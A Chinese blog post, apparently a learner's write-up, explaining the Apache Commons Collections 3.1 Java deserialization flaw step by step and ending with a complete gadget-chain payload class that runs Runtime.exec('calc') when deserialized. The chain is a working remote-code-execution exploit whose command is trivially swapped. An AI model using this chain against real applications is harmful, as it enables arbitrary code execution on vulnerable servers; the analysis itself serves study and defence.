## 前言：

入坑安全也有快一年了，以前一直是在学习PHP，对于Java这块了解的很少，也有想过去学习Java安全，奈何一直找不到入门的方法。最近静下心来看了很多大牛的笔记，博客，收获颇丰，在此记录一下入坑Java安全的第一步。。。

Apache Commons Collections是Apache
Commons的组件，该漏洞的问题主要出现在org.apache.commons.collections.Transformer接口上。在Apache
commons.collections中有一个InvokerTransformer实现了Transformer接口，主要作用为调用Java的反射机制来调用任意函数。

影响组件版本：<=3.1

## 一、环境搭建

本地测试，下载commons-collections-3.1.zip，在项目中导入对应的jar包：commons-collections-3.1.jar

例如：

在IntelliJ IDEA中创建一个普通的Java工程，然后File --> Project Structure --> Libraries -->
+添加相应的jar包

## 二、漏洞分析

既然是反序列化漏洞，我们假设有这样一条语句：

    
    
    FileInputStream fileInputStream = new FileInputStream("unserialize.bin");  
    ObjectInputStream input = new ObjectInputStream(fileInputStream);  
    Object object = input.readObject();  
    input.close();  
    fileInputStream.close();

意思是从unserialize.bin二进制文件中取出二进制数据，对其进行反序列化。

如果unserialize.bin的文件内容可控的话（也就是用户可以进行输入），那么可能会存在反序列化漏洞。

（有点类似于PHP的反序列化，利用的前提都是程序中存在可以利用的类或者利用链）

如果程序使用了低版本的Apache Commons的组件，那么就可以构造相应的输入，达到RCE的目的。

下面对commons.collections中利用的类进行分析：

在该组件中有一个Transformer接口：

    
    
    package org.apache.commons.collections;  
    ​  
    public interface Transformer {  
    Object transform(Object var1);  
    }

有一个实现了该接口的类，InvokerTransformer，可以去看看源码：

    
    
    public class InvokerTransformer implements Transformer, Serializable {  
    private final String iMethodName;  
    private final Class[] iParamTypes;  
    private final Object[] iArgs;  
    ​  
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {  
    this.iMethodName = methodName;  
    this.iParamTypes = paramTypes;  
    this.iArgs = args;  
    }  
    ​  
    public Object transform(Object input) {  
    if (input == null) {  
    return null;  
    } else {  
    try {  
    Class cls = input.getClass();  
    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);  
    return method.invoke(input, this.iArgs);  
    } catch (NoSuchMethodException var5) {  
    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");  
    } catch (IllegalAccessException var6) {  
    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");  
    } catch (InvocationTargetException var7) {  
    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);  
    }  
    }  
    }  
    ​  
    }

这里仔细分析一下transform方法，可以发现这里利用了反射机制，调用传入的对象的任意方法。

上面的三个参数分别表示的意思是：

methodName：方法名

paramTypes： 参数类型

args：传入方法的参数值

一般来说，想要RCE，需要使用到Runtime这个类，但是Runtime的构造函数是一个私有方法，所以不能够直接对其进行实例化，需要调用静态方法来实例化，例如：

    
    
    Runtime.getRuntime.exec("calc");

  

如果想要直接调用上面的InvokerTransformer的transform方法进行命令执行，可以这样写：

    
    
    Runtime runtime = Runtime.getRuntime();  
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec",  
    new Class[]{String.class},  
    new String[]{"calc"});  
    invokerTransformer.transform(runtime);

个人理解：以上写法直接实例化了一个Runtime对象，但是Runtime类并没有实现序列化接口（可以去看源码），也就是说，Runtime实例对象不能够被序列化，因此在构建Payload的时候，尽量在程序中不要出现Runtime实例化出来的对象，因此后面引出了两个类：

ConstantTransformer类和ChainedTransformer类

先来看看ConstantTransformer类：

    
    
    public ConstantTransformer(Object constantToReturn) {  
    this.iConstant = constantToReturn;  
    }  
    ​  
    public Object transform(Object input) {  
    return this.iConstant;  
    }

它的transform方法会把传入的参数直接返回出来；

再来看看ChainedTransformer类：

    
    
    public ChainedTransformer(Transformer[] transformers) {  
    this.iTransformers = transformers;  
    }  
    ​  
    public Object transform(Object object) {  
    for(int i = 0; i < this.iTransformers.length; ++i) {  
    object = this.iTransformers[i].transform(object);  
    }  
    ​  
    return object;  
    }

关键部分在这里：

    
    
    object = this.iTransformers[i].transform(object);

如果iTransformers为上面的InvokerTransformer对象，我们可以构造多个InvokerTransformer对象（注意这里的iTransformers是个数组），让这条语句通过反射来创建Runtime的实例，例如：

    
    
    Transformer[] transformers = new Transformer[]{  
    //获取java.lang.class  
    new ConstantTransformer(Runtime.class),  
      
    //执行Runtime.class.getMethod("getRuntime")  
    new InvokerTransformer("getMethod",  
    new Class[] {String.class, Class[].class },  
    new Object[] {"getRuntime", new Class[0] }),  
      
    //执行Runtime.class.getMethod("getRuntime").invoke()  
    new InvokerTransformer("invoke",  
    new Class[] {Object.class, Object[].class },  
    new Object[] {null, new Object[0] }),  
    //执行Runtime.class.getMethod("getRuntime").invoke().exec  
    new InvokerTransformer("exec",  
    new Class[] {String.class },  
    new Object[] {"calc"})  
    };  
    ​  
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
    chainedTransformer.transform("123");

构造到这里，可以发现，只要执行chainedTransformer.transform()方法就可以RCE。

但是，既然是反序列化漏洞，最好的利用情况是当用户传入的输入流被反序列化以后，就能够直接进行攻击（也就是说当程序直接调用readObject方法时将触发漏洞），因此，后面引出了另外几个类：

TransformeMap和AnnotationInvocationHandler类

首先来看看TransformeMap这个类：

    
    
    protected Object checkSetValue(Object value) {  
    return this.valueTransformer.transform(value);  
    }

在该类里面有checkSetValue这样一个方法，会调用valueTransformer.transform

也就是说这里需要构造this.valueTransformer为上面的chainedTransformer的值；

通过分析构造函数，我们发现这个值是可以直接构造的：

    
    
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    return new TransformedMap(map, keyTransformer, valueTransformer);  
    }  
    ​  
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    super(map);  
    this.keyTransformer = keyTransformer;  
    this.valueTransformer = valueTransformer;  
    }

（由于TransformedMap是受保护的构造函数，因此这里要利用该类提供的静态方法decorate进行初始化）

接下来，继续跟进TransformeMap的父类AbstractInputCheckedMapDecorator，在里面有一个静态的内部类：

    
    
    static class MapEntry extends AbstractMapEntryDecorator {  
    private final AbstractInputCheckedMapDecorator parent;  
    ​  
    protected MapEntry(Entry entry, AbstractInputCheckedMapDecorator parent) {  
    super(entry);  
    this.parent = parent;  
    }  
    ​  
    public Object setValue(Object value) {  
    value = this.parent.checkSetValue(value);  
    return super.entry.setValue(value);  
    }  
    }

这里的setValue方法调用了checkSetValue，如果this.parent指向我们前面构造的TransformeMap对象，那么这里就可以触发漏洞点。

在前面的基础上加上这个：也可以命令执行

    
    
    Map innerMap = new HashMap();  
    innerMap.put("1", "1");  
    //构造TransformedMap对象，带入前面构造的transformerChain  
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
    //返回Entry这个内部类  
    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();  
    ​  
    onlyElement.setValue("123123");

下面分析一下 这条语句：

    
    
    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();

首先调用outerMap.entrySet()，也就是TransformedMap的entrySet方法：

    
    
    public Set entrySet() {  
    return (Set)(this.isSetValueChecking() ? new AbstractInputCheckedMapDecorator.EntrySet(super.map.entrySet(), this) : super.map.entrySet());  
    }

跟进一下this.isSetValueChecking：

    
    
    protected boolean isSetValueChecking() {  
    return this.valueTransformer != null;  
    }

通过之前的构造，我们这里会返回true，也就是说，上面的outerMap.entrySet()会返回new
AbstractInputCheckedMapDecorator.EntrySet(super.map.entrySet(), this)；

  

跟进一下这个类：（它其实也是一个静态的内部类，和上面我们需要的那个MapEntry在一个类里面）

    
    
    static class EntrySet extends AbstractSetDecorator {  
    private final AbstractInputCheckedMapDecorator parent;  
    ​  
    protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {  
    super(set);  
    this.parent = parent;  
    }  
    public Iterator iterator() {  
    return new AbstractInputCheckedMapDecorator.EntrySetIterator(super.collection.iterator(), this.parent);  
    }  
    }

可以发现，它将我们传入的transformerChain赋值给了parent；

接下来程序执行iterator方法，也就是上面的：

    
    
    public Iterator iterator() {  
    return new AbstractInputCheckedMapDecorator.EntrySetIterator(super.collection.iterator(), this.parent);  
    }

发现它返回了另一个对象，跟进一下这个对象：（仍然是一个静态内部类）

    
    
    static class EntrySetIterator extends AbstractIteratorDecorator {  
    private final AbstractInputCheckedMapDecorator parent;  
    ​  
    protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) {  
    super(iterator);  
    this.parent = parent;  
    }  
    ​  
    public Object next() {  
    Entry entry = (Entry)super.iterator.next();  
    return new AbstractInputCheckedMapDecorator.MapEntry(entry, this.parent);  
    }  
    }

它也将我们前面构造的transformerChain赋值给了parent；

最后程序调用next方法，也就是：

    
    
    public Object next() {  
    Entry entry = (Entry)super.iterator.next();  
    return new AbstractInputCheckedMapDecorator.MapEntry(entry, this.parent);  
    }

发现它正好返回了我们最终需要构造的这个内部类MapEntry，并且将parent正好赋值成我们构造的transformerChain值；

最后调用onlyElement.setValue("123123");触发命令执行；

分析到这里，还是不够，因为我们想要构造一个只需要调用反序列化函数便可以触发漏洞的利用链，这里就需要用到AnnotationInvocationHandler这个类（JDK版本要小于1.7），该类重写了readObject方法，在该方法里面调用了map的setValue方法：

    
    
    private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    s.defaultReadObject();  
    ​  
    ​  
    // Check to make sure that types have not evolved incompatibly  
    ​  
    AnnotationType annotationType = null;  
    try {  
    annotationType = AnnotationType.getInstance(type);  
    } catch(IllegalArgumentException e) {  
    // Class is no longer an annotation type; all bets are off  
    return;  
    }  
    ​  
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();  
    ​  
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {  
    String name = memberValue.getKey();  
    Class<?> memberType = memberTypes.get(name);  
    if (memberType != null) {  // i.e. member still exists  
    Object value = memberValue.getValue();  
    if (!(memberType.isInstance(value) ||  
    value instanceof ExceptionProxy)) {  
    memberValue.setValue(  
    new AnnotationTypeMismatchExceptionProxy(  
    value.getClass() + "[" + value + "]").setMember(  
    annotationType.members().get(name)));  
    }  
    }  
    }

（这个代码是网上找的，自己的jdk版本是1.8~~~~）

这里可以发现memberValues是一个map对象，并且是可以由我们直接传入参数的，它这里用到了这样一条语句：

    
    
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()){  
    memberValue.setValue(...)  
    }

其实跟上面的构造是一样的：

    
    
    memberValues.entrySet().iterator().next()

到这里，就比较明显了。我们传入一个构造好的AnnotationInvocationHandler对象，目标对其进行反序列，便会造成任意代码执行。

Payload如下：

    
    
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.map.HashedMap;  
    import org.apache.commons.collections.map.TransformedMap;  
    import java.io.*;  
    import java.util.HashMap;  
    import java.lang.reflect.Constructor;  
    import java.util.Map;  
    import java.lang.reflect.InvocationTargetException;  
    import java.lang.reflect.Method;  
    ​  
    public class test implements Serializable{  
    ​  
    public static void main(String[] args) throws Exception  
    {  
    Transformer[] transformers = {  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),  
    new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),  
    new InvokerTransformer("exec",  
    new Class[] {String.class },  
    new Object[] {"calc"})  
    };  
    Transformer transformerChain = new ChainedTransformer(transformers);  
    ​  
    Map map = new HashMap();  
    map.put("value", "2");  
    ​  
    Map transformedmap = TransformedMap.decorate(map, null, transformerChain);  
    ​  
    ​  
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);  
    cons.setAccessible(true);  
    ​  
    Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);  
      
    //将ins序列化  
    ByteArrayOutputStream exp = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(exp);  
    oos.writeObject(ins);  
    oos.flush();  
    oos.close();  
      
    //取出序列化的数据流进行反序列化，验证  
    ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(out);  
    Object obj = (Object) ois.readObject();  
      
    }  
    }

## 三、总结

反序列化漏洞都需要用到程序中存在的已知类，因此查找存在BUG的类很重要。

Java的反序列化漏洞是真的复杂，不过确实很有意思。（就比如上面构造的iterator().next()正好契合利用的那个类的迭代）。

用到反射机制，可能是因为一些需要利用的类并没有继承反序列化接口，因此使用动态生成相应的对象可以避免不能序列化，从而可以构造想要的payload数据流。

参考链接：

<https://www.smi1e.top/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bapache-commons-collections/>

<https://xz.aliyun.com/t/136#toc-0>

